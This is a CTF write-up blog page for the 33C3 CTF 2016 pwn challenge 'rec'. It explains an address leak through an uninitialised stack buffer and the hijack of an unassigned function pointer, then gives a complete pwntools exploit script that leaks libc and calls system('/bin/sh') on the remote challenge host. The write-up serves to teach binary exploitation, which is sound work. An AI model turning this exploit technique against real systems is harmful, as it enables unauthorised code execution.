<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>33C3 CTF 2016 – rec - Hacking Tube 2.0</title>
<meta name="description" content="Category: pwnPoints: 200">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:title" content="33C3 CTF 2016 – rec">
<meta property="og:url" content="http://0.0.0.0:4000/33c3-ctf-2016-rec/">


  <meta property="og:description" content="Category: pwnPoints: 200">







  <meta property="article:published_time" content="2016-12-30T01:38:00+08:00">






<link rel="canonical" href="http://0.0.0.0:4000/33c3-ctf-2016-rec/">













<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if lte IE 9]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->


    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    <div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        <a class="site-title" href="/">Hacking Tube 2.0</a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about" >About</a>
            </li><li class="masthead__menu-item">
              <a href="/archives/" >Archive</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle Menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="http://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
    
    
      <p class="author__bio" itemprop="description">
        Vulnerability researcher / CTFer
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
        </li>
      

      
        
          
            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
          
            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
    <meta itemprop="headline" content="33C3 CTF 2016 – rec">
    <meta itemprop="description" content="Category: pwnPoints: 200">
    <meta itemprop="datePublished" content="December 30, 2016">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">33C3 CTF 2016 – rec
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p><strong>Category:</strong> pwn
<strong>Points:</strong> 200</p>

<!-- more -->

<p>32 bit ELF, with all the protection enabled.</p>

<p>program menu:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&gt; 
</code></pre></div></div>
<ul>
  <li>Take note: input a note</li>
  <li>Read note: output the note</li>
  <li>Polish: do the <code class="highlighter-rouge">sum</code> operation or the elementary arithmetic (prefix expression)</li>
  <li>Infix: do the elementary arithmetic (infix expression)</li>
  <li>Reverse Polish: do the elementary arithmetic (postfix expression)</li>
  <li>Sign: input a number and see if it is a positive/negative number</li>
</ul>

<p>First we found that the <code class="highlighter-rouge">Read note</code> function doesn’t work well:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&gt; 0
Your note: 123
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&gt; 1
Your note:�VXV`�s��`XV     &lt;-- WTF?
</code></pre></div></div>

<p>This is because the program use a stack address as the <code class="highlighter-rouge">note</code>’s buffer. After we take a note and leave the function, the buffer will be filled with some (useful) addresses (due to the function epilogue). And because of this, we’re able to leak the stack address &amp; text’s base address.</p>

<p>Now it’s time to try controlling the EIP. There’s a program logic vulnerability in the <code class="highlighter-rouge">sign</code> function:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">puts_negative</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">puts_positive</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v1</span><span class="p">();</span>
</code></pre></div></div>
<p>It handles both positive &amp; negative numbers. <strong>But what about <code class="highlighter-rouge">0</code></strong> ?</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&gt; 5
0
[1]    40091 segmentation fault (core dumped)  ./rec
</code></pre></div></div>
<p>The reason why the program crash is because the program did not assigned a value to <code class="highlighter-rouge">v1</code> (since it did not handle <code class="highlighter-rouge">0</code>), so when it ran to line <code class="highlighter-rouge">v1()</code>, it will set the EIP to <code class="highlighter-rouge">0x0</code> and crash the program. Let’s check the assembly code:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x56555d3b:  mov    eax,DWORD PTR [ebp-0x20]   &lt;-- &amp;v1 = ebp-0x20
0x56555d3e:  call   eax
</code></pre></div></div>
<p>It shows that if we can control the value of <code class="highlighter-rouge">[ebp-0x20]</code>, we’ll be able to control the EIP and hijack the program control flow.</p>

<p>I found that the stack frame of the <code class="highlighter-rouge">sign</code> function is “higher” (or “lesser”) than the other functions. If we can’t “reach that high” in other functions, we won’t be able to control the function pointer.</p>

<p>After done some fuzzing, I finally found that in the <code class="highlighter-rouge">Polish</code> function, if we do the <code class="highlighter-rouge">sum</code> operation and keep entering number, the program will keep pushing number to the stack, making us able to “reach the height” and control the function pointer (and the parameters !) in the <code class="highlighter-rouge">sign</code> function.</p>

<p>So here’s how we gonna exploit the service:</p>
<ol>
  <li>Take a note &amp; Read the note, leak the text’s base address</li>
  <li>Use <code class="highlighter-rouge">Polish</code>’s <code class="highlighter-rouge">sum</code> operation to control the function pointer &amp; the function parameter. We first set the function pointer to <code class="highlighter-rouge">puts</code> and the parameter to <code class="highlighter-rouge">__libc_start_main@got</code> (there’s no <code class="highlighter-rouge">.got.plt</code> due to the <strong>FULL RELRO</strong> protection)</li>
  <li>Goto <code class="highlighter-rouge">sign</code> function and input <code class="highlighter-rouge">0</code>, it will call <code class="highlighter-rouge">puts(__libc_start_main@got)</code> and gave us the libc’s base address</li>
  <li>Repeat step 2, this time we set the function pointer to <code class="highlighter-rouge">system</code> and the parameter to “pointer to /bin/sh”</li>
  <li>Goto <code class="highlighter-rouge">sign</code> function and input <code class="highlighter-rouge">0</code>, call <code class="highlighter-rouge">system("/bin/sh")</code> and get the shell</li>
</ol>

<p>Here’s the exploit. The libc’s information are provided by <a href="https://github.com/niklasb/libc-database">libc-database</a>
```python exp_rec.py
#!/usr/bin/env python</p>

<p>from pwn import *
import subprocess
import sys
import time
import numpy</p>

<p>HOST = “78.46.224.74”
PORT = 4127
ELF_PATH = “./rec”
LIBC_PATH = “”</p>

<h1 id="setting">setting</h1>
<p>context.arch = ‘i386’
context.os = ‘linux’
context.endian = ‘little’
context.word_size = 32</p>
<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
<p>context.log_level = ‘INFO’</p>

<p>elf = ELF(ELF_PATH)</p>

<p>def take_note(note):
    r.sendlineafter(“&gt; “, “0”)
    r.sendlineafter(“note: “, note)</p>

<p>def read_note():
    r.sendlineafter(“&gt; “, “1”)</p>

<p>def polish_sum(nums):
    r.sendlineafter(“&gt; “, “2”)
    r.sendlineafter(“Operator:”, “S”)
    for num in nums:
        print “adding:”, num
        r.sendlineafter(“Operand:”, str(num))</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r.sendlineafter("Operand:", ".")
</code></pre></div></div>

<p>def sign(num):
    r.sendlineafter(“&gt; “, “5”)
    r.sendline(str(num))</p>

<p>if <strong>name</strong> == “<strong>main</strong>”:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
#r = process(ELF_PATH)

take_note("123")
read_note()

r.recvuntil("note: ")
fptr_addr = u32(r.recv(4)) - 0x350 # where the function pointer be loaded
text_base = u32(r.recv(4)) - 0x6fb
puts = text_base + 0x520
lsm_got = text_base + 0x2fe0
puts_got = text_base + 0x2fd8

log.success("fptr_addr: "+hex(fptr_addr))
log.success("text_base: "+hex(text_base))

nums = [i for i in xrange(0x63)] + [puts, lsm_got]
polish_sum(nums)

sign(0) # this will call puts(lsm_got)
lsm_addr = u32(r.recv(4))
#########################################
#$ ./dump libc6-i386_2.24-3ubuntu2_amd64
#offset___libc_start_main = 0x00018180
#offset_system = 0x0003a8b0
#offset_str_bin_sh = 0x15cbcf
#########################################
system_addr = lsm_addr + 0x22730 
bin_sh = lsm_addr + 0x144a4f 

log.success("lsm: "+hex(lsm_addr))
log.success("system: "+hex(system_addr))
log.success("bin_sh: "+hex(bin_sh))

nums = [i for i in xrange(0x63)] + [numpy.int32(system_addr), numpy.int32(bin_sh)]
polish_sum(nums)
sign(0) # this time will call system("/bin/sh")

r.interactive() ```
</code></pre></div></div>

<p>The flag is in <code class="highlighter-rouge">/challenge/flag.txt</code></p>

<p>flag: <code class="highlighter-rouge">33C3_L0rd_Nikon_would_l3t_u_1n</code></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#33c3" class="page__taxonomy-item" rel="tag">33C3</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-12-30T01:38:00+08:00">December 30, 2016</time></p>
        
      </footer>

      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
<!-- Remove linkdin shared button -->
<section class="page__share">
  

  <a href="https://twitter.com/intent/tweet?text=33C3+CTF+2016+--+rec%20http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-rec%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-rec%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-rec%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>

</section>


      
  <nav class="pagination">
    
      <a href="/33c3-ctf-2016-babyfengshui/" class="pagination--pager" title="33C3 CTF 2016 – babyfengshui
">Previous</a>
    
    
      <a href="/1784510/" class="pagination--pager" title="DEFCON CTF 2017 Quals – peROPdo
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Introduction

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Introduction

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable

</p>
  </article>
</div>
        
      </div>
    </div>
  
</div>
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
    <div id="results" class="results"></div></div>
      </div>
    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/33c3-ctf-2016-rec/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "/33c3-ctf-2016-rec"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  



  </body>
</html>